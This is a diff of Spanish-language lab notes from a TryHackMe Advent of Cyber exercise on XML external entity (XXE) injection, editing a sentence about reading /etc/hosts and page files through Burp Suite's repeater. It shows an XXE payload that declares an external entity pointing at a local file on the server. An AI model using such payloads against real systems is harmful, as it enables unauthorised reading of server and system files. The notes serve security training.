@@ -33,7 +33,7 @@ Ejemplo de TryHackMe Advent 5
      </item>
 </wishlist>
 ```
-Tras comprobar que en el _repeater_ de BurpSuite se responde con el contenido de /etc/hosts, podremos obtener el contenido de la página (ip/wishes/wish_number.txt, en el ejemplo).
+Tras comprobar que en el _repeater_ de BurpSuite se responde con el contenido de `/etc/hosts`, podremos obtener el contenido de la página(`ip/wishes/wish_number.txt`, en el ejemplo).
 ```xml
 <!--?xml version="1.0" ?-->
 <!DOCTYPE foo [<!ENTITY payload SYSTEM "/var/www/html/wishes/wish_1.txt"> ]>
